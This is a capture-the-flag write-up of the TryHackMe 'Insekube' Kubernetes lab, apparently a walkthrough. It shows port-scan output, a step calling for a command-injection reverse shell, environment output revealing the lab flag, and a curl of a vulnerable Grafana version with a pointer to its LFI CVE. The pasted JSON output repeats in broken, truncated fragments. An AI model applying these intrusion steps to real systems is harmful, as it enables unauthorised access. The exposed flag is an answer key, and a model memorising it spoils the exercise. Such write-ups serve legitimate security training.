---
Exploiting Kubernetes by leveraging a Grafana LFI vulnerability
---

# Insekube — Writeup

## Overview
### Insekube — Writeup
### Insekube — Writeup
![](https://i.imgur.com/aOga4CU.png)
### Introduction
Start Machine
The learning objectives for this room are:
-   Interacting with the cluster using `kubectl`
-   Reading Kubernetes secrets
-   Doing recon inside the cluster
-   Switching service accounts to escalate your privileges
-   Lateral movement into other workloads
-   Gaining access to the Kubernetes nodes
We assume basic knowledge of the Kubernetes architecture and some experience running Kubernetes administration tools like kubectl.
Disclaimer: Due to this room running on a VM it uses minikube which is not exactly the same as running a fully fledged Kubernetes cluster so you might experience some minor differences with a real cluster.
﻿This machine can take a while to boot up (Give it 4 or 5 minutes)
Scan the machine. (If you are unsure how to tackle this, I recommend checking out the [Nmap](https://tryhackme.com/room/furthernmap) room)
Answer the questions below

## Enumeration
```text
not work  

after 1 month is up port 80

┌──(witty㉿kali)-[~/Downloads]
└─$ rustscan -a 10.10.124.104 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.124.104:22
Open 10.10.124.104:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-03 18:28 EST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 18:28
Completed NSE at 18:28, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 18:28
Completed NSE at 18:28, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 18:28
Completed NSE at 18:28, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 18:28
Completed Parallel DNS resolution of 1 host. at 18:28, 0.02s elapsed
DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 18:28
Scanning 10.10.124.104 [2 ports]
Discovered open port 80/tcp on 10.10.124.104
Discovered open port 22/tcp on 10.10.124.104
Completed Connect Scan at 18:28, 0.20s elapsed (2 total ports)
Initiating Service scan at 18:28
Scanning 2 services on 10.10.124.104
Completed Service scan at 18:30, 104.73s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.124.104.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 18:30
Completed NSE at 18:30, 6.25s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 18:30
Completed NSE at 18:30, 2.12s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 18:30
Completed NSE at 18:30, 0.00s elapsed
Nmap scan report for 10.10.124.104
Host is up, received user-set (0.20s latency).
Scanned at 2023-03-03 18:28:21 EST for 113s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 9fae049ef075edb73980a0d87fbd6106 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCpKksU81PRNTKP1wxKXB9jq0Yk6id6JCuj4gYTAPk932sjBdUV4OhoMBP1m2cITHGWBWiE02KzRSkgL9X0FZL6CJRxo09N2uHXp6XT5+V+VMf1/5B1xgETNdpqgltDpqYudiKpNQzRpkvvtvCntDr+R0/4LWi7CsmII2wYFSnZ8/8UtueRCGue3Mn9oeUp1R+m5yODXfJHgcHmvHsdbx1JX/7dzwI8QSFNhnXcQwRFkRcNJBmYjlMq1SvqXQMzgR70dIv/9zfFIROPyjfLkeGsmLBEflsPmLo8Nt5CxQzUzx5w/PcnRsTv+X6syJXGjS6pD82hgPH/AtZGaNePAvcQjNPzYF2ZWB6WcMWJROMqeWYasava17FZOyEqteIsW0/JeXIZroSJT792OaGH/8nwqkLNmLE2Ab54GjunAeZEdb3MB2qeQ6iszeBCutm+CZr9HI4aRTgmfdCIRPuJJxqQeSCpLb0kNdvt36OFCmTpMMdaj9WSaFbl7Ywvd0WIVn0=
|   256 cfcb89629911d7cacd5b577810d06c82 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDJH2hRXWCeM4AC7WvCY/PpWUXdSiNB+E05tW7LGCL0R6WTJLTCKpmKMWdaf3PbDMgPJlR9GzaPhOvUBFZ0uI8U=
|   256 5f11100d7c80a3fcd1d5434e49f9c8d2 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPvap+hnXqIVCd8pv3lHrx6kbI2FqAazMvM3mjg2uiE4
80/tcp open  http    syn-ack
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
| http-methods: 
|_  Supported Methods: GET HEAD
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Date: Fri, 03 Mar 2023 23:28:27 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 1196
|     Connection: close
|     <!DOCTYPE html>
|     <head>
|     <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css"
|     integrity="sha384-JcKb8q3iqJ61gNV9KGb8thSsNjpSL0n8PARn9HuZOnIxN0hoP+VmmDGMN5t9UJ0Z" crossorigin="anonymous">
|     <style>
|     body,
|     html {
|     height: 100%;
|     </style>
|     </head>
|     <body>
|     <div class="container h-100">
|     <div class="row mt-5">
|     <div class="col-12 mb-4">
|     class="text-center">Check if a website is down 
|     </h3>
|     </div>
|     <form class="col-6 mx-auto" action="/">
|     <div class=" input-group">
|     <input name="hostname" value="" type="text" class="form-control" placeholder="Hostname"
|   HTTPOptions: 
|     HTTP/1.1 405 Method Not Allowed
|     Date: Fri, 03 Mar 2023 23:28:27 GMT
|     Content-Type: text/plain; charset=utf-8
|     Content-Length: 18
|     Allow: GET, HEAD
|     Connection: close
|     Method Not Allowed
|   RTSPRequest: 
|     HTTP/1.1 405 Method Not Allowed
|     Date: Fri, 03 Mar 2023 23:28:28 GMT
|     Content-Type: text/plain; charset=utf-8
|     Content-Length: 18
|     Allow: GET, HEAD
|     Connection: close
|_    Method Not Allowed
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.93%I=7%D=3/3%Time=6402829B%P=x86_64-pc-linux-gnu%r(GetRe
SF:quest,535,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Fri,\x2003\x20Mar\x202023
SF:\x2023:28:27\x20GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\n
SF:Content-Length:\x201196\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20htm
SF:l>\n\n<head>\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"htt
SF:ps://stackpath\.bootstrapcdn\.com/bootstrap/4\.5\.2/css/bootstrap\.min\
SF:.css\"\n\x20\x20\x20\x20\x20\x20\x20\x20integrity=\"sha384-JcKb8q3iqJ61
SF:gNV9KGb8thSsNjpSL0n8PARn9HuZOnIxN0hoP\+VmmDGMN5t9UJ0Z\"\x20crossorigin=
SF:\"anonymous\">\n\x20\x20\x20\x20<style>\n\x20\x20\x20\x20\x20\x20\x20\x
SF:20body,\n\x20\x20\x20\x20\x20\x20\x20\x20html\x20{\n\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20height:\x20100%;\n\x20\x20\x20\x20\x20\x20
SF:\x20\x20}\n\x20\x20\x20\x20</style>\n</head>\n\n<body>\n\x20\x20\x20\x2
SF:0<div\x20class=\"container\x20h-100\">\n\x20\x20\x20\x20\x20\x20\x20\x2
SF:0<div\x20class=\"row\x20mt-5\">\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20<div\x20class=\"col-12\x20mb-4\">\n\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h3\x20class=\"text-center\">Chec
SF:k\x20if\x20a\x20website\x20is\x20down\x20\xf0\x9f\x92\xa3</h3>\n\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\n\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20<form\x20class=\"col-6\x20mx-auto\"\x20action
SF:=\"/\">\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20<div\x20class=\"\x20input-group\">\n\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<input\x20name=\"hostnam
SF:e\"\x20value=\"\"\x20type=\"text\"\x20class=\"form-control\"\x20placeho
SF:lder=\"Hostname\"\n\x20\x20\x20\x20\x20\x20\x20")%r(HTTPOptions,BC,"HTT
SF:P/1\.1\x20405\x20Method\x20Not\x20Allowed\r\nDate:\x20Fri,\x2003\x20Mar
SF:\x202023\x2023:28:27\x20GMT\r\nContent-Type:\x20text/plain;\x20charset=
SF:utf-8\r\nContent-Length:\x2018\r\nAllow:\x20GET,\x20HEAD\r\nConnection:
SF:\x20close\r\n\r\nMethod\x20Not\x20Allowed")%r(RTSPRequest,BC,"HTTP/1\.1
SF:\x20405\x20Method\x20Not\x20Allowed\r\nDate:\x20Fri,\x2003\x20Mar\x2020
SF:23\x2023:28:28\x20GMT\r\nContent-Type:\x20text/plain;\x20charset=utf-8\
SF:r\nContent-Length:\x2018\r\nAllow:\x20GET,\x20HEAD\r\nConnection:\x20cl
SF:ose\r\n\r\nMethod\x20Not\x20Allowed");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 18:30
Completed NSE at 18:30, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 18:30
Completed NSE at 18:30, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 18:30
Completed NSE at 18:30, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 114.24 seconds
```
What ports are open? (comma separated)
*22,80*
### RCE
Visit the website, it takes a host and returns the output of a ping command.
Use command injection to get a reverse shell. For more information on command injection attacks take a look at [this room](https://tryhackme.com/room/oscommandinjection)
You will find the flag in an environment variable.
Answer the questions below
Some interesting Kubernetes objects to look for would be `nodes`,  `deployments`, `services`, `ingress`, `jobs`... But the service account you control does not have access to any of them.
However, by default Kubernetes creates environment variables containing the host and port of the other services running in the cluster.
Running `env` you will see there is a `Grafana` service running in the cluster.
Insekube
```shell-session
challenge@syringe:/tmp$ env
KUBERNETES_SERVICE_PORT_HTTPS=443
GRAFANA_SERVICE_HOST=10.108.133.228
KUBERNETES_SERVICE_PORT=443
HOSTNAME=syringe-79b66d66d7-7mxhd
SYRINGE_PORT=tcp://10.99.16.179:3000
GRAFANA_PORT=tcp://10.108.133.228:3000
SYRINGE_SERVICE_HOST=10.99.16.179
SYRINGE_PORT_3000_TCP=tcp://10.99.16.179:3000
GRAFANA_PORT_3000_TCP=tcp://10.108.133.228:3000
PWD=/tmp
SYRINGE_PORT_3000_TCP_PROTO=tcp
HOME=/home/challenge
KUBERNETES_PORT_443_TCP=tcp://10.96.0.1:443
LS_COLORS=
GOLANG_VERSION=1.15.7
****************************************
SHLVL=2
SYRINGE_PORT_3000_TCP_PORT=3000
GRAFANA_PORT_3000_TCP_PORT=3000
KUBERNETES_PORT_443_TCP_PROTO=tcp
KUBERNETES_PORT_443_TCP_ADDR=10.96.0.1
GRAFANA_SERVICE_PORT=3000
SYRINGE_PORT_3000_TCP_ADDR=10.99.16.179
SYRINGE_SERVICE_PORT=3000
KUBERNETES_SERVICE_HOST=10.96.0.1
KUBERNETES_PORT=tcp://10.96.0.1:443
KUBERNETES_PORT_443_TCP_PORT=443
GRAFANA_PORT_3000_TCP_PROTO=tcp
PATH=/usr/local/go/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
OLDPWD=/home/challenge
GRAFANA_PORT_3000_TCP_ADDR=10.108.133.228
_=/usr/bin/env
```
Kubernetes will create a hostname for the name of the service so you can access the service at `http://grafana:3000` or the Grafana endpoint in my case `http://10.108.133.228:3000`.
Do some enumeration to find out the version. Curl the `/login` page and look for the version.
Google for known CVEs for this Grafana version. It is vulnerable to LFI (Local File Inclusion).
Answer the questions below
```text
challenge@syringe-79b66d66d7-6xdjz:/tmp$ env
env
KUBERNETES_SERVICE_PORT_HTTPS=443
GRAFANA_SERVICE_HOST=10.105.120.1
KUBERNETES_SERVICE_PORT=443
HOSTNAME=syringe-79b66d66d7-6xdjz
SYRINGE_PORT=tcp://10.103.9.166:3000
GRAFANA_PORT=tcp://10.105.120.1:3000
SYRINGE_SERVICE_HOST=10.103.9.166
SYRINGE_PORT_3000_TCP=tcp://10.103.9.166:3000
GRAFANA_PORT_3000_TCP=tcp://10.105.120.1:3000
PWD=/tmp
SYRINGE_PORT_3000_TCP_PROTO=tcp
HOME=/home/challenge
KUBERNETES_PORT_443_TCP=tcp://10.96.0.1:443
LS_COLORS=
GOLANG_VERSION=1.15.7
FLAG=flag{5e7cc6165f6c2058b11710a26691bb6b}
SHLVL=2
SYRINGE_PORT_3000_TCP_PORT=3000
GRAFANA_PORT_3000_TCP_PORT=3000
KUBERNETES_PORT_443_TCP_PROTO=tcp
KUBERNETES_PORT_443_TCP_ADDR=10.96.0.1
GRAFANA_SERVICE_PORT=3000
SYRINGE_PORT_3000_TCP_ADDR=10.103.9.166
SYRINGE_SERVICE_PORT=3000
KUBERNETES_SERVICE_HOST=10.96.0.1
KUBERNETES_PORT=tcp://10.96.0.1:443
KUBERNETES_PORT_443_TCP_PORT=443
GRAFANA_PORT_3000_TCP_PROTO=tcp
PATH=/usr/local/go/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
OLDPWD=/tmp
GRAFANA_PORT_3000_TCP_ADDR=10.105.120.1
_=/usr/bin/env

curl 10.105.120.1:3000/login
curl 10.105.120.1:3000/login
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0<!doctype html><html lang="en"><head><meta charset="utf-8"/><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/><meta name="viewport" content="width=device-width"/><meta name="theme-color" content="#000"/><title>Grafana</title><base href="/"/><link rel="preload" href="public/fonts/roboto/RxZJdnzeo3R5zSexge8UUVtXRa8TVwTICgirnJhmVJw.woff2" as="font" crossorigin/><link rel="icon" type="image/png" href="public/img/fav32.png"/><link rel="apple-touch-icon" sizes="180x180" href="public/img/apple-touch-icon.png"/><link rel="mask-icon" href="public/img/grafana_mask_icon.svg" color="#F05A28"/><link rel="stylesheet" href="public/build/grafana.dark.cb8720c05bfd4aaf3291.css"/><script nonce="">performance.mark('frontend_boot_css_time_seconds');</script><meta name="apple-mobile-web-app-capable" content="yes"/><meta name="apple-mobile-web-app-status-bar-style" content="black"/><meta name="msapplication-TileColor" content="#2b5797"/><meta name="msapplication-config" content="public/img/browserconfig.xml"/></head><body class="theme-dark app-grafana"><style>.preloader {
        height: 100%;
        flex-direction: column;
        display: flex;
        justify-content: center;
        align-items: center;
      }

      .preloader__enter {
        opacity: 0;
        animation-name: preloader-fade-in;
        animation-iteration-count: 1;
        animation-duration: 0.9s;
        animation-delay: 1.35s;
        animation-fill-mode: forwards;
      }

      .preloader__bounce {
        text-align: center;
        animation-name: preloader-bounce;
        animation-duration: 0.9s;
        animation-iteration-count: infinite;
      }

      .preloader__logo {
        display: inline-block;
        animation-name: preloader-squash;
        animation-duration: 0.9s;
        animation-iteration-count: infinite;
        width: 60px;
        height: 60px;
        background-repeat: no-repeat;
        background-size: contain;
        background-image: url('public/img/grafana_icon.svg');
      }

      .preloader__text {
        margin-top: 16px;
        font-weight: 500;
        font-size: 14px;
        font-family: Sans-serif;
        opacity: 0;
        animation-name: preloader-fade-in;
        animation-duration: 0.9s;
        animation-delay: 1.8s;
        animation-fill-mode: forwards;
      }

      .theme-light .preloader__text {
        color: #52545c;
      }

      .theme-dark .preloader__text {
        color: #d8d9da;
      }

      @keyframes preloader-fade-in {
        0% {
          opacity: 0;
           
          animation-timing-function: cubic-bezier(0, 0, 0.5, 1);
        }
        100% {
          opacity: 1;
        }
      }

      @keyframes preloader-bounce {
        from,
        to {
          transform: translateY(0px);
          animation-timing-function: cubic-bezier(0.3, 0, 0.1, 1);
        }
        50% {
          transform: translateY(-50px);
          animation-timing-function: cubic-bezier(0.9, 0, 0.7, 1);
        }
      }

      @keyframes preloader-squash {
        0% {
          transform: scaleX(1.3) scaleY(0.8);
          animation-timing-function: cubic-bezier(0.3, 0, 0.1, 1);
          transform-origin: bottom center;
        }
        15% {
          transform: scaleX(0.75) scaleY(1.25);
          animation-timing-function: cubic-bezier(0, 0, 0.7, 0.75);
          transform-origin: bottom center;
        }
        55% {
          transform: scaleX(1.05) scaleY(0.95);
          animation-timing-function: cubic-bezier(0.9, 0, 1, 1);
          transform-origin: top center;
        }
        95% {
          transform: scaleX(0.75) scaleY(1.25);
          animation-timing-function: cubic-bezier(0, 0, 0, 1);
          transform-origin: bottom center;
        }
        100% {
          transform: scaleX(1.3) scaleY(0.8);
          transform-origin: bottom center;
          animation-timing-function: cubic-bezier(0, 0, 0.7, 1);
        }
      }

       
      .preloader__text--fail {
        display: none;
      }

       
      .preloader--done .preloader__bounce,
      .preloader--done .preloader__logo {
        animation-name: none;
        display: none;
      }

      .preloader--done .preloader__logo,
      .preloader--done .preloader__text {
        display: none;
        color: #ff5705 !important;
        font-size: 15px;
      }

      .preloader--done .preloader__text--fail {
        display: block;
      }

      [ng\:cloak],
      [ng-cloak],
      .ng-cloak {
        display: none !important;
      }</style><div class="preloader"><div class="preloader__enter"><div class="preloader__bounce"><div class="preloader__logo"></div></div></div><div class="preloader__text">Loading Grafana</div><div class="preloader__text preloader__text--fail"><p><strong>If you're seeing this Grafana has failed to load its application files</strong><br/><br/></p><p>1. This could be caused by your reverse proxy settings.<br/><br/>2. If you host grafana under subpath make sure your grafana.ini root_url setting includes subpath. If not using a reverse proxy make sure to set serve_from_sub_path to true.<br/><br/>3. If you have a local dev build make sure you build frontend using: yarn start, yarn start:hot, or yarn build<br/><br/>4. Sometimes restarting grafana-server can help<br/><br/>5. Check if you are using a non-supported browser. For more information, refer to the list of <a href="https://grafana.com/docs/grafana/latest/installation/requirements/#supported-web-browsers">supported browsers</a>.</p></div><script nonce="">
        
        function checkBrowserCompatibility() {
          var isIE = navigator.userAgent.indexOf('MSIE') > -1;
          var isEdge = navigator.userAgent.indexOf('Edge/') > -1 || navigator.userAgent.indexOf('Edg/') > -1;
          var isFirefox = navigator.userAgent.toLowerCase().indexOf('firefox') > -1;
          var isChrome = /Chrome/.test(navigator.userAgent) && /Google Inc/.test(navigator.vendor);

          

          var isEdgeVersion = /Edge\/([0-9.]+)/.exec(navigator.userAgent);

          if (isIE && parseFloat(/Trident\/([0-9.]+)/.exec(navigator.userAgent)[1]) <= 7) {
            return false;
          } else if (
            isEdge &&
            ((isEdgeVersion && parseFloat(isEdgeVersion[1]) <= 16) ||
              parseFloat(/Edg\/([0-9.]+)/.exec(navigator.userAgent)[1]) <= 16)
          ) {
            return false;
          } else if (isFirefox && parseFloat(/Firefox\/([0-9.]+)/.exec(navigator.userAgent)[1]) <= 64) {
            return false;
          } else if (isChrome && parseFloat(/Chrome\/([0-9.]+)/.exec(navigator.userAgent)[1]) <= 54) {
            return false;
          }

          return true;
        }

        if (!checkBrowserCompatibility()) {
          alert('Your browser is not fully supported, please try newer version.');
        }</script></div><div id="reactRoot"></div><script nonce="">window.grafanaBootData = {
        user: {"isSignedIn":false,"id":0,"login":"","email":"","name":"","lightTheme":false,"orgCount":0,"orgId":0,"orgName":"","orgRole":"","isGrafanaAdmin":false,"gravatarUrl":"","timezone":"browser","weekStart":"browser","locale":"en-US","helpFlags1":0,"hasEditPermissionInFolders":false},
        settings: {"alertingEnabled":false,"alertingErrorOrTimeout":"alerting","alertingMinInterval":1,"alertingNoDataOrNullValues":"no_data","allowOrgCreate":false,"appSubUrl":"","appUrl":"http://localhost:3000/","applicationInsightsConnectionString":"","applicationInsightsEndpointUrl":"","authProxyEnabled":false,"autoAssignOrg":true,"awsAllowedAuthProviders":["default","keys","credentials"],"awsAssumeRoleEnabled":true,"azure":{"cloud":"AzureCloud","managedIdentityEnabled":false},"buildInfo":{"buildstamp":1637855786,"commit":"8d74cc357","edition":"Enterprise","env":"production","hasUpdate":false,"hideVersion":false,"isEnterprise":false,"latestVersion":"","version":"8.3.0-beta2"},"caching":{"enabled":true},"datasources":{"-- Dashboard --":{"meta":{"id":"dashboard","type":"datasource","name":"-- Dashboard --","info":{"author":{"name":"","url":""},"description":"","links":null,"logos":{"small":"public/img/icn-datasource.svg","large":"public/img/icn-datasource.svg"},"build":{},"screenshots":null,"version":"","updated":""},"dependencies":{"grafanaDependency":"","grafanaVersion":"*","plugins":[]},"includes":null,"category":"","preload":false,"backend":false,"routes":null,"skipDataQuery":false,"autoEnabled":false,"annotations":false,"metrics":true,"alerting":false,"explore":false,"tables":false,"logs":false,"tracing":false,"builtIn":true,"streaming":false,"signature":"internal","module":"app/plugins/datasource/dashboard/module","baseUrl":"public/app/plug        settings: {"alertingEnabled":false,"alertingErrorOrTimeout":"alerting","alertingMinInterval":1,"alertingNoDataOrNullValues":"no_data","allowOrgCreate":false,"appSubUrl":"","appUrl":"http://localhost:3000/","applicationInsightsConnectionString":"","applicationInsightsEndpointUrl":"","authProxyEnabled":false,"autoAssignOrg":true,"awsAllowedAuthProviders":["default","keys","credentials"],"awsAssumeRoleEnabled":true,"azure":{"cloud":"AzureCloud","managedIdentityEnabled":false},"buildInfo":{"buildstamp":1637855786,"commit":"8d74cc357","edition":"Enterprise","env":"production","hasUpdate":false,"hideVersion":false,"isEnterprise":false,"latestVersion":"","version":"8.3.0-beta2"},"caching":{"enabled":true},"datasources":{"-- Dashboard --":{"meta":{"id":"dashboard","type":"datasource","name":"-- Dashboard --","info":{"author":{"name":"","url":""},"description":"","links":null,"logos":{"small":"public/img/icn-datasource.svg","large":"public/img/icn-datasource.svg"},"build":{},"screenshots":null,"version":"","updated":""},"dependencies":{"grafanaDependency":"","grafanaVersion":"*","plugins":[]},"includes":null,"category":"","preload":false,"backend":false,"routes":null,"skipDataQuery":false,"autoEnabled":false,"annotations":false,"metrics":true,"alerting":false,"explore":false,"tables":false,"logs":false,"tracing":false,"builtIn":true,"streaming":false,"signature":"internal","module":"app/plugins/datasource/dashboard/module","baseUrl":"public/app/plug        settings: {"alertingEnabled":false,"alertingErrorOrTimeout":"alerting","alertingMinInterval":1,"alertingNoDataOrNullValues":"no_data","allowOrgCreate":false,"appSubUrl":"","appUrl":"http://localhost:3000/","applicationInsightsConnectionString":"","applicationInsightsEndpointUrl":"","authProxyEnabled":false,"autoAssignOrg":true,"awsAllowedAuthProviders":["default","keys","credentials"],"awsAssumeRoleEnabled":true,"azure":{"cloud":"AzureCloud","managedIdentityEnabled":false},"buildInfo":{"buildstamp":1637855786,"commit":"8d74cc357","edition":"Enterprise","env":"production","hasUpdate":false,"hideVersion":false,"isEnterprise":false,"latestVersion":"","version":"8.3.0-beta2"},"caching":{"enabled":true},"datasources":{"-- Dashboard --":{"meta":{"id":"dashboard","type":"datasource","name":"-- Dashboard --","info":{"author":{"name":"","url":""},"description":"","links":null,"logos":{"small":"public/img/icn-datasource.svg","large":"public/img/icn-datasource.svg"},"build":{},"screenshots":null,"version":"","updated":""},"dependencies":{"grafanaDependency":"","grafanaVersion":"*","plugins":[]},"includes":null,"category":"","preload":false,"backend":false,"routes":null,"skipDataQuery":false,"autoEnabled":false,"annotations":false,"metrics":true,"alerting":false,"explore":false,"tables":false,"logs":false,"tracing":false,"builtIn":true,"streaming":false,"signature":"internal","module":"app/plugins/datasource/dashboard/module","baseUrl":"public/app/plugins/datasource/dashboard"},"name":"-- Dashboard --","type":"datasource"},"-- Grafana --":{"id":-1,"meta":{"id":"grafana","type":"datasource","name":"-- Grafana --","info":{"author":{"name":"","url":""},"description":"","links":null,"logos":{"small":"public/img/icn-datasource.svg","large":"public/img/icn-datasource.svg"},"build":{},"screenshots":null,"version":"","updated":""},"dependencies":{"grafanaDependency":"","grafanaVersion":"*","plugins":[]},"includes":null,"category":"","preload":false,"backend":false,"routes":null,"skipDataQuery":false,"autoEnabled":false,"annotations":true,"metrics":true,"alerting":false,"explore":false,"tables":false,"logs":false,"tracing":false,"builtIn":true,"streaming":false,"signature":"internal","module":"app/plugins/datasource/grafana/module","baseUrl":"public/app/plugins/datasource/grafana"},"name":"-- Grafana --","type":"datasource","uid":"grafana"},"-- Mixed --":{"meta":{"id":"mixed","type":"datasource","name":"-- Mixed --","info":{"author":{"name":"","url":""},"description":"","links":null,"logos":{"small":"public/img/icn-datasource.svg","large":"public/img/icn-datasource.svg"},"build":{},"screenshots":null,"version":"","updated":""},"dependencies":{"grafanaDependency":"","grafanaVersion":"*","plugins":[]},"includes":null,"category":"","preload":false,"backend":false,"routes":null,"skipDataQuery":false,"autoEnabled":false,"annotations":false,"metrics":true,"alerting":false,"explore":false,"tables":false,"logs":false,"tracing":false,"queryOptions":{"minInterval":true},"builtIn":true,"mixed":true,"streaming":false,"signature":"internal","module":"app/plugins/datasource/mixed/module","baseUrl":"public/app/plugins/datasource/mixed"},"name":"-- Mixed --","type":"datasource"}},"dateFormats":{"fullDate":"YYYY-MM-DD HH:mm:ss","useBrowserLocale":false,"interval":{"second":"HH:mm:ss","minute":"HH:mm","hour":"MM/DD HH:mm","day":"MM/DD","month":"YYYY-MM","year":"YYYY"},"defaultTimezone":"browser","defaultWeekStart":"browser"},"defaultDatasource":"-- Grafana --","disableLoginForm":false,"disableSanitizeHtml":false,"disableUserSignUp":true,"editorsCanAdmin":false,"exploreEnabled":true,"expressionsEnabled":true,"externalUserMngInfo":"","externalUserMngLinkName":"","externalUserMngLinkUrl":"","featureToggles":{},"googleAnalyticsId":"","http2Enabled":false,"ldapEnabled":false,"licenseInfo":{"edition":"Enterprise","expiry":0,"hasLicense":false,"hasValidLicense":false,"licenseUrl":"https://grafana.com/products/enterprise/?utm_source=grafana_footer","stateInfo":"Free \u0026 unlicensed"},"licensing":{},"liveEnabled":true,"loginHint":"email or username","minRefreshInterval":"5s","oauth":{},"panels":{"alertlist":{"baseUrl":"public/app/plugins/panel/alertlist","hideFromList":false,"id":"alertlist","info":{"author":{"name":"Grafana Labs","url":"https://grafana.com"},"description":"Shows list of alerts and their current status","links":null,"logos":{"small":"public/app/plugins/panel/alertlist/img/icn-singlestat-panel.svg","large":"public/app/plugins/panel/alertlist/img/icn-singlestat-panel.svg"},"build":{},"screenshots":null,"version":"","updated":""},"module":"app/plugins/panel/alertlist/module","name":"Alert list","signature":"internal","skipDataQuery":true,"sort":15,"state":""},"annolist":{"baseUrl":"public/app/plugins/panel/annolist","hideFromList":false,"id":"annolist","info":{"author":{"name":"Grafana Labs","url":"https://grafana.com"},"description":"List annotations","links":null,"logos":{"small":"public/app/plugins/panel/annolist/img/icn-annolist-panel.svg","large":"public/app/plugins/panel/annolist/img/icn-annolist-panel.svg"},"build":{},"screenshots":null,"version":"","updated":""},"module":"app/plugins/panel/annolist/module","name":"Annotations list","signature":"internal","skipDataQuery":true,"sort":100,"state":""},"barchart":{"baseUrl":"public/app/plugins/panel/barchart","hideFromList":false,"id":"barchart","info":{"author":{"name":"Grafana Labs","url":"https://grafana.com"},"description":"Categorical charts with group support","links":null,"logos":{"small":"public/app/plugins/panel/barchart/img/barchart.svg","large":"public/app/plugins/panel/barchart/img/barchart.svg"},"build":{},"screenshots":null,"version":"","updated":""},"module":"app/plugins/panel/barchart/module","name":"Bar chart","signature":"internal","skipDataQuery":false,"sort":2,"state":"beta"},"bargauge":{"baseUrl":"public/app/plugins/panel/bargauge","hideFromList":false,"id":"bargauge","info":{"author":{"name":"Grafana Labs","url":"https://grafana.com"},"description":"Horizontal and vertical gauges","links":null,"logos":{"small":"public/app/plugins/panel/bargauge/img/icon_bar_gauge.svg","large":"public/app/plugins/panel/bargauge/img/icon_bar_gauge.svg"},"build":{},"screenshots":null,"version":"","updated":""},"module":"app/plugins/panel/bargauge/module","name":"Bar gauge","signature":"internal","skipDataQuery":false,"sort":5,"state":""},"candlestick":{"baseUrl":"public/app/plugins/panel/candlestick","hideFromList":false,"id":"candlestick","info":{"author":{"name":"Grafana 